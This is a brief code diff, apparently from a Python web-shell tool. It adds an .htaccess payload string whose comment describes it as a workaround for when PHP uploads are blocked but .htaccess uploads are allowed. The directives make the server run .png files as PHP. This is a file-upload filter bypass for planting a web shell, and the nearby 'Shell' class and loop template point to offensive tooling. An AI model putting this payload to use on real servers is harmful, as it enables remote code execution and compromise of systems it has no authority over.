@@ -18,6 +18,13 @@ while (1) {
 }
 '''
 
+# when can not upload php but can upload .htaccess
+# and allow rewrite use this one
+htaccessRewrite = '''
+AddType application/x-httpd-php .png
+php_flag engine 1
+'''
+
 
 class Shell(object):
 
